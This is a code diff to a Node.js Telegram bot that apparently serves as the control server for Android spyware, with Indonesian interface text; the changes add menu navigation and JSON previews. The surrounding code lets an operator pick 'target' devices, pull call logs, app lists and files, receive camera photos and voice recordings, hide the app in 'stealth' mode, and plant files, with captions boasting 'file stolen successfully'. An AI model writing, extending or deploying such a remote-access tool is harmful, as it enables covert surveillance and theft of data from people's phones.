@@ -164,6 +164,9 @@ const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) 
     if (pageNum < state.totalPages) navBtns.push(Markup.button.callback('Next ➡️', `pagecmd:${client_id}:${pageNum + 1}`));
     if (navBtns.length > 0) inlineBtns.push(navBtns);
 
+    // Back to Menu Button
+    inlineBtns.push([Markup.button.callback('🔙 Menu Utama', `select_dev:${client_id}`), Markup.button.callback('🔄 Ganti Perangkat', 'list_devices')]);
+
     const caption = `📂 <b>File Explorer [${escapeHTML(client_id)}]</b>\n\n📍 Lokasi: <code>${escapeHTML(state.path)}</code>\n📄 Halaman: ${pageNum} dari ${state.totalPages}\n<i>(Klik 📄 File untuk Download)</i>`;
 
     try {
@@ -179,6 +182,7 @@ const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) 
 
 // --- TELEGRAM BOT ---
 let bot;
+let lastSelectedDevice = null;
 if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
     bot = new Telegraf(TELEGRAM_TOKEN);
 
@@ -250,7 +254,12 @@ Harus diketik dengan format:
 
     const listDevicesToChat = async (ctx) => {
         const devices = await db.all('SELECT * FROM devices');
-        if (devices.length === 0) return ctx.reply('📭 Belum ada perangkat yang terhubung ke server.');
+        const isCallback = ctx.callbackQuery ? true : false;
+
+        if (devices.length === 0) {
+            const msg = '📭 Belum ada perangkat yang terhubung ke server.';
+            return isCallback ? ctx.editMessageText(msg) : ctx.reply(msg);
+        }
 
         const buttons = [];
         devices.forEach(d => {
@@ -259,16 +268,27 @@ Harus diketik dengan format:
             buttons.push([Markup.button.callback(`${statusIcon} ${d.id}`, `select_dev:${d.id}`)]);
         });
 
-        ctx.reply('📱 <b>Pilih Target Perangkat:</b>', {
-            parse_mode: 'HTML',
-            ...Markup.inlineKeyboard(buttons)
-        });
+        const caption = '📱 <b>Pilih Target Perangkat:</b>';
+        const opts = { parse_mode: 'HTML', ...Markup.inlineKeyboard(buttons) };
+
+        if (isCallback) {
+            try { await ctx.editMessageText(caption, opts); }
+            catch (e) { await ctx.reply(caption, opts); }
+        } else {
+            ctx.reply(caption, opts);
+        }
     };
+
+    bot.action('list_devices', async (ctx) => {
+        ctx.answerCbQuery().catch(() => { });
+        listDevicesToChat(ctx);
+    });
 
     // Menangani klik dari tombol Device yang dipilih
     bot.action(/^select_dev:(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
-        ctx.answerCbQuery();
+        lastSelectedDevice = devId;
+        ctx.answerCbQuery().catch(() => { });
         // Reset path setiap kali memilih device
         devicePaths[devId] = "/storage/emulated/0";
 
@@ -283,18 +303,22 @@ Harus diketik dengan format:
             [Markup.button.callback('📳 Getar 2 dkt', `runcmd:${devId}:vibrate 2`), Markup.button.callback('🚨 Alarm Panik!', `runcmd:${devId}:play_alarm`)],
             [Markup.button.callback('☎️ Riwayat Panggilan', `runcmd:${devId}:get_call_logs 30`), Markup.button.callback('📦 Daftar App', `runcmd:${devId}:get_installed_apps`)],
             [Markup.button.callback('📂 File Explorer', `runcmd:${devId}:ls /storage/emulated/0`)],
-            [Markup.button.callback('👻 Hide App (Stealth)', `runcmd:${devId}:hide_app`)]
+            [Markup.button.callback('👻 Hide (Stealth)', `runcmd:${devId}:hide_app`), Markup.button.callback('🔄 Ganti Perangkat', 'list_devices')]
         ];
 
-        ctx.reply(`🎯 <b>Perangkat Terpilih:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`, {
-            parse_mode: 'HTML',
-            ...Markup.inlineKeyboard(menuBtns)
-        });
+        const caption = `🎯 <b>Menu Utama Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
+        const opts = { parse_mode: 'HTML', ...Markup.inlineKeyboard(menuBtns) };
+        try {
+            await ctx.editMessageText(caption, opts);
+        } catch (e) {
+            await ctx.reply(caption, opts);
+        }
     });
 
     // Menangani klik perintah spesifik dari device
     bot.action(/^runcmd:(.+):(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
+        lastSelectedDevice = devId;
         const fullCmd = ctx.match[2];
         const parts = fullCmd.split(' ');
         const cmdName = parts[0];
@@ -340,10 +364,9 @@ Harus diketik dengan format:
 
     // Menangani aksi Upload File via Telegram (Reply ke Pesan Menu atau Manual)
     bot.on(['document', 'photo'], async (ctx) => {
-        // Ambil ID Dev dari memory path jika ada yang aktif
-        const devIdList = Object.keys(devicePaths);
-        if (devIdList.length === 0) return ctx.reply('⚠️ Harap pilih perangkat dulu dari /list sebelum mengunggah file.');
-        const devId = devIdList[0]; // Simplifikasi untuk single admin 
+        // Ambil ID Dev terakhir yang sedang dikontrol oleh admin
+        const devId = lastSelectedDevice;
+        if (!devId) return ctx.reply('⚠️ Harap pilih perangkat dulu dari menu /list sebelum mengunggah file.');
 
         try {
             const fileObj = ctx.message.document || ctx.message.photo[ctx.message.photo.length - 1];
@@ -453,12 +476,17 @@ app.post('/response', async (req, res) => {
             if (cmd && cmd.chat_id && bot) {
                 const deviceResponse = data.data !== undefined ? data.data : data;
 
+                // Helper untuk menyematkan tombol di balik setiap respons
+                const getNavOpts = () => Markup.inlineKeyboard([
+                    [Markup.button.callback('🔙 Menu Utama', `select_dev:${client_id}`), Markup.button.callback('🔄 Ganti Perangkat', 'list_devices')]
+                ]);
+
                 if (data.type === 'audio_base64') {
                     const audioBuffer = Buffer.from(deviceResponse, 'base64');
                     await bot.telegram.sendAudio(cmd.chat_id, {
                         source: audioBuffer,
                         filename: `record_${data.id}.3gp`
-                    }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
+                    }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
                     return res.json({ status: 'received' });
                 }
 
@@ -466,7 +494,7 @@ app.post('/response', async (req, res) => {
                     const imageBuffer = Buffer.from(deviceResponse, 'base64');
                     await bot.telegram.sendPhoto(cmd.chat_id, {
                         source: imageBuffer
-                    }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
+                    }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
                     return res.json({ status: 'received' });
                 }
 
@@ -475,7 +503,7 @@ app.post('/response', async (req, res) => {
                     await bot.telegram.sendDocument(cmd.chat_id, {
                         source: fileBuffer,
                         filename: deviceResponse.name
-                    }, { caption: `✅ <b>Berhasil Curi File (${escapeHTML(client_id)})</b>\n📂 Nama: ${deviceResponse.name}`, parse_mode: 'HTML' });
+                    }, { caption: `✅ <b>Berhasil Curi File (${escapeHTML(client_id)})</b>\n📂 Nama: ${deviceResponse.name}`, parse_mode: 'HTML', ...getNavOpts() });
                     return res.json({ status: 'received' });
                 }
 
@@ -492,7 +520,7 @@ app.post('/response', async (req, res) => {
                 }
 
                 if (data.type === 'upload_success') {
-                    await bot.telegram.sendMessage(cmd.chat_id, `✅ <b>File berhasil disusupkan!</b>\n└ ${escapeHTML(deviceResponse)}`, { parse_mode: 'HTML' });
+                    await bot.telegram.sendMessage(cmd.chat_id, `✅ <b>File berhasil disusupkan!</b>\n└ ${escapeHTML(deviceResponse)}`, { parse_mode: 'HTML', ...getNavOpts() });
                     // Auto Refresh ls
                     const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                     const refreshCmdId = uuidv4().slice(0, 8);
@@ -501,19 +529,41 @@ app.post('/response', async (req, res) => {
                     return res.json({ status: 'received' });
                 }
 
+                // PRATINJAU JSON CERDAS
+                const generatePreview = (d) => {
+                    let preview = '';
+                    if (Array.isArray(d)) {
+                        const sub = d.slice(0, 5);
+                        preview = formatDeviceResponse(sub);
+                        if (d.length > 5) preview += `\n  ... <i>dan ${d.length - 5} baris lainnya.</i>`;
+                    } else if (typeof d === 'object' && d !== null) {
+                        const keys = Object.keys(d).slice(0, 10);
+                        const sub = {};
+                        keys.forEach(k => sub[k] = d[k]);
+                        preview = formatDeviceResponse(sub);
+                        if (Object.keys(d).length > 10) preview += `\n  ... <i>dan properti lainnya.</i>`;
+                    }
+                    return preview;
+                };
+
                 const jsonString = JSON.stringify(deviceResponse, null, 2);
 
-                // Jika ukuran pesan melebihi limit Telegram (4096 char), kirim sebagai file JSON
+                // Jika ukuran pesan melebihi limit Telegram (4096 char), kirim sebagai file JSON dengan Preview
                 if (jsonString.length > 3500) {
+                    const previewText = generatePreview(deviceResponse);
                     const buffer = Buffer.from(jsonString, 'utf-8');
                     await bot.telegram.sendDocument(cmd.chat_id, {
                         source: buffer,
                         filename: `response_${data.id}.json`
-                    }, { caption: `✅ <b>Respon dari alat (${escapeHTML(client_id)}):</b> Payload terlalu besar, dikirim sebagai file.`, parse_mode: 'HTML' });
+                    }, {
+                        caption: `✅ <b>Respon Super Besar [${escapeHTML(client_id)}]:</b>\n\n<b>🔍 Pratinjau Cepat:</b>\n${previewText}\n\n<i>📂 Selengkapnya silakan buka Dokumen JSON di atas.</i>`,
+                        parse_mode: 'HTML',
+                        ...getNavOpts()
+                    });
                 } else {
                     const formattedDisplay = formatDeviceResponse(deviceResponse);
                     const replyMessage = `✅ <b>Respon Eksekusi [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`;
-                    await bot.telegram.sendMessage(cmd.chat_id, replyMessage, { parse_mode: 'HTML' });
+                    await bot.telegram.sendMessage(cmd.chat_id, replyMessage, { parse_mode: 'HTML', ...getNavOpts() });
                 }
             }
         } catch (err) {
